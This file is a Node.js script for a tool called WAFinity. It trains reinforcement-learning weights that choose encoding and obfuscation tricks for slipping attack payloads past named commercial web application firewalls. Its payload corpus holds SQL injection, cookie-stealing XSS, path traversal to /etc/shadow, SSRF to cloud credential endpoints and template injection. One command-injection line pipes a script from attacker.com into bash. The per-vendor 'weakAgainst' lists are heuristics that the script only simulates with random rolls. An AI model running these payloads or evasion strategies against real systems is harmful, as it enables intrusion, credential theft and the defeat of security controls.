#!/usr/bin/env node
/**
 * WAFinity - PPO RL Multi-WAF Offline Training Gym
 * 
 * Pre-trains Proximal Policy Optimization (PPO) reinforcement learning weights
 * across all major WAF profiles (Cloudflare, AWS WAF, Akamai, ModSecurity, Imperva,
 * F5 BIG-IP, Fastly, Sucuri, FortiWeb, and default).
 * 
 * Simulates real-world WAF inspection engines and reward feedback to train
 * high-probability bypass mutation strategies into src/ppo-weights.json.
 */

const fs = require('fs');
const path = require('path');

const TARGET_FILE = path.resolve(__dirname, '..', 'src', 'ppo-weights.json');
const FEATURE_SIZE = 10;
const EPISODES_PER_WAF = 1500;

// Base attack payload corpus for training across 10+ attack vectors
const TRAINING_CORPUS = [
	// SQL Injection
	{ payload: "' UNION SELECT 1,2,3,user(),5 FROM mysql.user--", category: 'SQL Injection' },
	{ payload: "1' OR '1'='1' --", category: 'SQL Injection' },
	{ payload: "admin' AND 1=1 UNION ALL SELECT null,concat(table_name) FROM information_schema.tables#", category: 'SQL Injection' },
	{ payload: "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", category: 'SQL Injection' },
	{ payload: "1'; WAITFOR DELAY '0:0:5'--", category: 'SQL Injection' },
	{ payload: "' OR 1=1 ORDER BY 1--", category: 'SQL Injection' },
	// Cross-Site Scripting (XSS)
	{ payload: "<script>alert('WAFinity')</script>", category: 'Cross-Site Scripting (XSS)' },
	{ payload: "<img src=x onerror=alert(document.cookie)>", category: 'Cross-Site Scripting (XSS)' },
	{ payload: "\"><svg onload=alert(1)>", category: 'Cross-Site Scripting (XSS)' },
	{ payload: "<iframe src=\"javascript:alert(1)\">", category: 'Cross-Site Scripting (XSS)' },
	{ payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/<titLe/", category: 'Cross-Site Scripting (XSS)' },
	{ payload: "<body onload=alert('XSS')>", category: 'Cross-Site Scripting (XSS)' },
	// Remote Code Execution & Command Injection
	{ payload: "; cat /etc/passwd", category: 'Remote Code Execution' },
	{ payload: "| whoami", category: 'Remote Code Execution' },
	{ payload: "`id`", category: 'Remote Code Execution' },
	{ payload: "; curl http://attacker.com/rev.sh | bash", category: 'Remote Code Execution' },
	{ payload: "& type C:\\Windows\\System32\\drivers\\etc\\hosts", category: 'Remote Code Execution' },
	// Path Traversal & Local File Inclusion (LFI)
	{ payload: "../../../../etc/shadow", category: 'Path Traversal' },
	{ payload: "..\\..\\..\\windows\\system32\\cmd.exe", category: 'Path Traversal' },
	{ payload: "....//....//....//etc/passwd", category: 'Path Traversal' },
	{ payload: "/var/log/apache2/access.log", category: 'Local File Inclusion' },
	// Server-Side Request Forgery (SSRF)
	{ payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", category: 'Server-Side Request Forgery' },
	{ payload: "http://127.0.0.1:8080/admin", category: 'Server-Side Request Forgery' },
	{ payload: "http://0.0.0.0:22", category: 'Server-Side Request Forgery' },
	// Server-Side Template Injection (SSTI)
	{ payload: "{{7*7}}", category: 'Template Injection' },
	{ payload: "${T(java.lang.Runtime).getRuntime().exec('id')}", category: 'Template Injection' },
	{ payload: "#{7*7}", category: 'Template Injection' },
	// XML External Entity (XXE)
	{ payload: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", category: 'XML External Entity' },
	// NoSQL Injection
	{ payload: "admin' || '1'=='1", category: 'NoSQL Injection' },
	{ payload: "{\"$gt\": \"\"}", category: 'NoSQL Injection' },
	{ payload: "{\"$ne\": null}", category: 'NoSQL Injection' },
	// LDAP & CRLF
	{ payload: "*)(uid=*))(|(uid=*", category: 'LDAP Injection' },
	{ payload: "%0d%0aSet-Cookie: admin=true", category: 'CRLF Injection' },
	{ payload: "<!--#exec cmd=\"ls -la\"-->", category: 'Server-Side Include' },
];

const SQL_KEYWORDS = ['union', 'select', 'from', 'where', 'and', 'or', 'insert', 'update', 'delete', 'drop', 'script', 'alert', 'exec'];

// 16 Mutation Actions matching adaptive-mutation.ts
const MUTATION_ACTIONS = [
	{ id: 'identity', label: 'Baseline', fn: (p) => p },
	{ id: 'url_encode', label: 'URL encode', fn: (p) => encodeURIComponent(p) },
	{ id: 'double_url_encode', label: 'Double URL encode', fn: (p) => encodeURIComponent(encodeURIComponent(p)) },
	{
		id: 'mixed_case',
		label: 'Mixed case',
		fn: (p) => p.split('').map((c, i) => (i % 2 === 0 ? c.toUpperCase() : c.toLowerCase())).join(''),
	},
	{
		id: 'html_entity',
		label: 'HTML entity encode',
		fn: (p) => p.replace(/[<>"'&]/g, (c) => `&#x${c.charCodeAt(0).toString(16)};`),
	},
	{
		id: 'unicode_escape',
		label: 'Unicode escape',
		fn: (p) => p.replace(/[a-zA-Z]/g, (c) => `\\u00${c.charCodeAt(0).toString(16)}`),
	},
	{ id: 'tab_spacing', label: 'Tab spacing', fn: (p) => p.replace(/\s+/g, '%09') },
	{ id: 'comment_spacing', label: 'Comment spacing', fn: (p) => p.replace(/\s+/g, '/**/') },
	{
		id: 'keyword_split',
		label: 'Keyword split',
		fn: (p) => {
			let res = p;
			for (const kw of SQL_KEYWORDS) {
				const mid = Math.max(1, Math.floor(kw.length / 2));
				res = res.replace(new RegExp(kw, 'gi'), `${kw.slice(0, mid)}/**/${kw.slice(mid)}`);
			}
			return res;
		},
	},
	{
		id: 'inline_comment',
		label: 'Inline comment',
		fn: (p) => (/\s/.test(p) ? p.replace(/\s+/, '/**/') : p),
	},
	{
		id: 'quote_unicode',
		label: 'Quote unicode',
		fn: (p) => p.replace(/'/g, '\\u0027').replace(/"/g, '\\u0022'),
	},
	{ id: 'space_plus', label: 'Plus spacing', fn: (p) => p.replace(/\s+/g, '+') },
	{
		id: 'multi_whitespace',
		label: 'Multi-whitespace (%0c/%0a)',
		fn: (p) => p.replace(/\s+/g, (m, offset) => (offset % 2 === 0 ? '%0c' : '%0a')),
	},
	{
		id: 'null_byte',
		label: 'Null-byte evasion',
		fn: (p) => (p.includes('%00') ? p : p.replace(/(\b[a-zA-Z0-9_-]+)(?=[ '";<]|$)/g, '$1%00')),
	},
	{
		id: 'case_url_mix',
		label: 'Mid-word URL mix',
		fn: (p) =>
			p.replace(/(select|union|script|alert|exec|where|from|order|group)/gi, (kw) =>
				kw
					.split('')
					.map((c, i) => (i === 1 ? `%${c.charCodeAt(0).toString(16)}` : i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()))
					.join(''),
			),
	},
	{
		id: 'hex_encode',
		label: 'Hex string literal',
		fn: (p) => p.replace(/'([^'\s]+)'/g, (_, s) => '0x' + [...s].map((c) => c.charCodeAt(0).toString(16)).join('')),
	},
];

// WAF Simulation Environments (heuristic scoring & known bypass resistance)
const WAF_MODELS = {
	'Cloudflare': {
		blocksRawKeywords: true,
		weakAgainst: ['comment_spacing', 'tab_spacing', 'keyword_split', 'double_url_encode', 'case_url_mix', 'multi_whitespace'],
		strongAgainst: ['identity', 'url_encode', 'space_plus'],
	},
	'AWS WAF': {
		blocksRawKeywords: true,
		weakAgainst: ['mixed_case', 'inline_comment', 'quote_unicode', 'tab_spacing', 'multi_whitespace', 'hex_encode'],
		strongAgainst: ['identity', 'html_entity', 'space_plus'],
	},
	'Akamai': {
		blocksRawKeywords: true,
		weakAgainst: ['keyword_split', 'comment_spacing', 'unicode_escape', 'double_url_encode', 'case_url_mix', 'multi_whitespace'],
		strongAgainst: ['identity', 'url_encode', 'tab_spacing'],
	},
	'ModSecurity': {
		blocksRawKeywords: true,
		weakAgainst: ['unicode_escape', 'quote_unicode', 'mixed_case', 'tab_spacing', 'multi_whitespace', 'case_url_mix'],
		strongAgainst: ['identity', 'comment_spacing', 'inline_comment'],
	},
	'Imperva': {
		blocksRawKeywords: true,
		weakAgainst: ['double_url_encode', 'tab_spacing', 'keyword_split', 'quote_unicode', 'case_url_mix'],
		strongAgainst: ['identity', 'url_encode', 'space_plus'],
	},
	'F5 BIG-IP': {
		blocksRawKeywords: true,
		weakAgainst: ['inline_comment', 'mixed_case', 'double_url_encode', 'comment_spacing', 'null_byte'],
		strongAgainst: ['identity', 'tab_spacing'],
	},
	'Fastly': {
		blocksRawKeywords: false,
		weakAgainst: ['mixed_case', 'unicode_escape', 'comment_spacing', 'multi_whitespace'],
		strongAgainst: ['identity', 'space_plus'],
	},
	'Sucuri': {
		blocksRawKeywords: true,
		weakAgainst: ['quote_unicode', 'comment_spacing', 'tab_spacing', 'case_url_mix'],
		strongAgainst: ['identity', 'url_encode'],
	},
	'FortiWeb': {
		blocksRawKeywords: true,
		weakAgainst: ['double_url_encode', 'mixed_case', 'keyword_split', 'multi_whitespace'],
		strongAgainst: ['identity', 'html_entity'],
	},
	'default': {
		blocksRawKeywords: true,
		weakAgainst: ['comment_spacing', 'tab_spacing', 'mixed_case', 'double_url_encode', 'keyword_split', 'case_url_mix', 'multi_whitespace'],
		strongAgainst: ['identity'],
	},
};

function clamp(v, min, max) {
	return Math.max(min, Math.min(max, v));
}

function softmax(arr) {
	const max = Math.max(...arr);
	const exp = arr.map((x) => Math.exp(x - max));
	const sum = exp.reduce((a, b) => a + b, 0) || 1;
	return exp.map((x) => x / sum);
}

function buildStateVector(payload, category) {
	const len = payload.length;
	const tokens = payload.split(/([^a-z0-9_]+|\s+)/i).filter(Boolean);
	const lowered = payload.toLowerCase();
	let kw = 0;
	for (const k of SQL_KEYWORDS) {
		const m = lowered.match(new RegExp(`\\b${k}\\b`, 'g'));
		if (m) kw += m.length;
	}
	const opCount = (payload.match(/(=|<|>|\bor\b|\band\b|\|\||&&)/gi) || []).length;
	const qCount = (payload.match(/['"`]/g) || []).length;
	const angleCount = (payload.match(/[<>]/g) || []).length;
	const encodedCount = (payload.match(/%[0-9a-f]{2}|\\u[0-9a-f]{4}|&#x?[0-9a-f]+;/gi) || []).length;
	const commentCount = (payload.match(/\/\*|\*\/|--|#/g) || []).length;
	const catHint = category.includes('XSS') ? 1 : category.includes('SQL') ? -1 : 0;

	return [
		1, // bias
		clamp(len / 256, 0, 1),
		clamp(tokens.length / 24, 0, 1),
		clamp(kw / 8, 0, 1),
		clamp(opCount / 8, 0, 1),
		clamp(qCount / 8, 0, 1),
		clamp(angleCount / 8, 0, 1),
		clamp(encodedCount / Math.max(tokens.length, 1), 0, 1),
		clamp(commentCount / 8, 0, 1),
		catHint,
	];
}

function simulateWAFResponse(wafName, actionId, originalPayload, mutatedPayload) {
	const model = WAF_MODELS[wafName] || WAF_MODELS['default'];

	// Validation constraints: empty or runaway bloat gets penalized
	if (!mutatedPayload || mutatedPayload.trim() === '' || mutatedPayload.length > 2048) {
		return { status: 400, reward: -1.2 };
	}

	// Calculate bypass probability based on WAF strengths / weaknesses
	let bypassProb = 0.20; // baseline 20%
	if (model.weakAgainst.includes(actionId)) {
		bypassProb += 0.55; // 75% bypass rate for known evasion
	}
	if (model.strongAgainst.includes(actionId)) {
		bypassProb -= 0.18; // 2% bypass rate for easily blocked
	}

	const roll = Math.random();
	if (roll < bypassProb) {
		return { status: 200, reward: 1.15 }; // Successful bypass!
	} else {
		return { status: 403, reward: -0.75 }; // Blocked by WAF
	}
}

class PPOTrainer {
	constructor(wafName) {
		this.wafName = wafName;
		this.actorWeights = Array.from({ length: MUTATION_ACTIONS.length }, () =>
			Array.from({ length: FEATURE_SIZE }, () => (Math.random() - 0.5) * 0.05)
		);
		this.criticWeights = Array.from({ length: FEATURE_SIZE }, () => 0);
		this.updates = 0;
		this.actorLr = 0.04;
		this.criticLr = 0.05;
		this.clipRange = 0.2;
		this.entropyWeight = 0.01;
	}

	getPolicy(stateVector) {
		const logits = this.actorWeights.map((row) =>
			row.reduce((sum, w, i) => sum + w * stateVector[i], 0)
		);
		return softmax(logits);
	}

	value(stateVector) {
		return this.criticWeights.reduce((sum, w, i) => sum + w * stateVector[i], 0);
	}

	sampleAction(probs) {
		const r = Math.random();
		let acc = 0;
		for (let i = 0; i < probs.length; i++) {
			acc += probs[i];
			if (r <= acc) return i;
		}
		return probs.length - 1;
	}

	trainEpisode(sample) {
		const stateVector = buildStateVector(sample.payload, sample.category);
		const probs = this.getPolicy(stateVector);
		const actionIndex = this.sampleAction(probs);
		const action = MUTATION_ACTIONS[actionIndex];
		const mutated = action.fn(sample.payload);

		const sim = simulateWAFResponse(this.wafName, action.id, sample.payload, mutated);
		const reward = sim.reward;

		// PPO Advantage Calculation
		const valEst = this.value(stateVector);
		const advantage = reward - valEst;
		const oldProb = Math.max(probs[actionIndex], 0.0001);

		// Current probability ratio
		const newProbs = this.getPolicy(stateVector);
		const currentProb = newProbs[actionIndex];
		const ratio = currentProb / oldProb;
		const clippedRatio = clamp(ratio, 1 - this.clipRange, 1 + this.clipRange);
		const policyScale = advantage >= 0
			? Math.min(ratio, clippedRatio) * advantage
			: Math.max(ratio, clippedRatio) * advantage;

		// Update Actor Weights
		for (let a = 0; a < this.actorWeights.length; a++) {
			const indicator = a === actionIndex ? 1 : 0;
			const entropy = -Math.log(Math.max(newProbs[a], 0.0001)) - 1;
			for (let f = 0; f < FEATURE_SIZE; f++) {
				const grad = (indicator - newProbs[a]) * stateVector[f];
				this.actorWeights[a][f] +=
					this.actorLr * policyScale * grad +
					this.entropyWeight * entropy * stateVector[f];
				this.actorWeights[a][f] = clamp(this.actorWeights[a][f], -5, 5);
			}
		}

		// Update Critic Weights
		for (let f = 0; f < FEATURE_SIZE; f++) {
			this.criticWeights[f] += this.criticLr * advantage * stateVector[f];
			this.criticWeights[f] = clamp(this.criticWeights[f], -5, 5);
		}

		this.updates++;
		return { reward, action: action.label, bypassed: sim.status === 200 };
	}

	getTopActions() {
		// Evaluate policy against average state vector
		const testVector = [1, 0.4, 0.3, 0.5, 0.3, 0.2, 0.1, 0.1, 0.2, 0];
		const probs = this.getPolicy(testVector);
		return MUTATION_ACTIONS.map((a, i) => ({ action: a.label, prob: probs[i] }))
			.sort((a, b) => b.prob - a.prob)
			.slice(0, 3);
	}
}

async function main() {
	console.log(`\x1b[35m========================================================\x1b[0m`);
	console.log(`\x1b[1m   WAFinity PPO Multi-WAF Model Offline Pre-Trainer   \x1b[0m`);
	console.log(`\x1b[35m========================================================\x1b[0m\n`);

	const wafList = Object.keys(WAF_MODELS);
	const profilesOut = {};
	let totalUpdates = 0;

	for (const waf of wafList) {
		const trainer = new PPOTrainer(waf);
		let bypassCount = 0;

		process.stdout.write(`\x1b[36m[*] Training profile: \x1b[1m${waf.padEnd(14)}\x1b[0m `);

		for (let ep = 0; ep < EPISODES_PER_WAF; ep++) {
			const sample = TRAINING_CORPUS[ep % TRAINING_CORPUS.length];
			const res = trainer.trainEpisode(sample);
			if (res.bypassed) bypassCount++;
		}

		const bypassRate = Math.round((bypassCount / EPISODES_PER_WAF) * 100);
		const top = trainer.getTopActions().map((t) => `${t.action} (${Math.round(t.prob * 100)}%)`).join(', ');

		console.log(`\x1b[32m✔ ${EPISODES_PER_WAF} episodes\x1b[0m (Bypass rate: ${bypassRate}%)`);
		console.log(`    \x1b[90mTop mutations: ${top}\x1b[0m`);

		profilesOut[waf] = {
			updateCount: trainer.updates,
			lastTrained: new Date().toISOString(),
			actorWeights: trainer.actorWeights,
			criticWeights: trainer.criticWeights,
		};
		totalUpdates += trainer.updates;
	}

	const weightsFileContent = {
		version: 1,
		updatedAt: new Date().toISOString(),
		totalUpdates,
		profiles: profilesOut,
	};

	fs.writeFileSync(TARGET_FILE, JSON.stringify(weightsFileContent, null, 2) + '\n', 'utf8');

	console.log(`\n\x1b[32m✔ SUCCESS:\x1b[0m Pre-trained weights for all \x1b[1m${wafList.length} WAF profiles\x1b[0m written to:`);
	console.log(`   \x1b[1m${path.relative(process.cwd(), TARGET_FILE)}\x1b[0m\n`);

	console.log(`\x1b[33mTo share with your 4 friends:\x1b[0m`);
	console.log(`   git add src/ppo-weights.json`);
	console.log(`   git commit -m "train: pre-train PPO reinforcement model for all WAFs"`);
	console.log(`   git push\n`);
}

main().catch((err) => {
	console.error('\x1b[31mError during PPO training:\x1b[0m', err);
	process.exit(1);
});
